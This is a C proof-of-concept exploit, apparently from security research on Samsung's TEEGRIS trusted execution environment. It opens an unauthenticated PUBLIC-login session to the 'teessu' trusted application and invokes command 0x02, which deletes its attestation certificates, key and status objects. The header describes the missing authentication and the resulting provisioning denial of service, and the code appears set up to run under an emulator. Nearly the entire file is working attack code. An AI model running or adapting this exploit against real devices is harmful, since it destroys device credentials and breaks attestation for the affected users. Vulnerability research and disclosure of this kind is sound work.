/*
 * teessu CLEAR_DATA (cmd 0x02) — unauthenticated persistent-object wipe.
 *
 * Finding (RE/samsung_teegris/teessu.md #1, emulation/teessu.md): teessu's
 * TA_OpenSessionEntryPoint returns 0 with no caller check, and the dispatcher
 * routes cmd 2 straight to teessu_cmd_clear_data with no per-command auth.
 * That handler deletes ssu_cert, intermediate_cert (the DRK cert), ssu_key and
 * ssu_status — a FOTA/attestation re-provisioning DoS reachable by any REE
 * process that can open a TEEGRIS session.
 *
 * This PoC opens a PUBLIC-login session (no credentials) and invokes cmd 2.
 * With the persistent store now modelled, the host can observe the ssu_*
 * objects vanish from emulator/emulate/files/1/.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "tee_client_api.h"
#include "repro.h"

TEEC_Result (*TEEC_OpenSession_impl)(TEEC_Context*, TEEC_Session*, const TEEC_UUID*,
                                     uint32_t, const void*, TEEC_Operation*, uint32_t*);
TEEC_Result (*TEEC_InitializeContext_impl)(const char*, TEEC_Context*);
void (*TEEC_FinalizeContext_impl)(TEEC_Context*);
void (*TEEC_CloseSession_impl)(TEEC_Session*);
TEEC_Result (*TEEC_InvokeCommand_impl)(TEEC_Session*, uint32_t, TEEC_Operation*, uint32_t*);
TEEC_Result (*TEEC_RegisterSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);

void cleanup_shm(){
#if EMULATE
    system("ipcrm -M 0x13337"); system("ipcrm -M 0x13338");
    system("ipcrm -M 0x13339"); system("ipcrm -M 0x1333a");
#endif
}

int main(void)
{
    char* ta = "00000000-0000-0000-0000-544545535355";   /* teessu */
    TEEC_UUID *uuid = teegris_uuid(ta);
    uint32_t err_origin;
    TEEC_Result res;
    TEEC_Context context;
    TEEC_Session session;
    TEEC_Operation op;

    cleanup_shm();
    load_functions();

    res = TEEC_InitializeContext_impl(NULL, &context);
    if (res != TEEC_SUCCESS) { printf("InitializeContext failed 0x%x\n", res); exit(-1); }

    /* PUBLIC login — no credentials. teessu's OpenSession returns 0 regardless. */
    res = TEEC_OpenSession_impl(&context, &session, uuid, TEEC_LOGIN_PUBLIC,
                               NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS) {
        printf("OpenSession failed 0x%x origin 0x%x\n", res, err_origin);
        TEEC_FinalizeContext_impl(&context); exit(-1);
    }
    printf("[*] session opened to teessu with TEEC_LOGIN_PUBLIC (no creds)\n");

    /* cmd 2 = CLEAR_DATA. No in-buf; default param validation. */
    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_NONE, TEEC_NONE, TEEC_NONE, TEEC_NONE);
    printf("[*] invoking cmd 0x02 (CLEAR_DATA) ...\n");
    res = TEEC_InvokeCommand_impl(&session, 0x02, &op, &err_origin);
    printf("[*] CLEAR_DATA returned 0x%x (origin 0x%x)\n", res, err_origin);

    TEEC_CloseSession_impl(&session);
    TEEC_FinalizeContext_impl(&context);
    return 0;
}
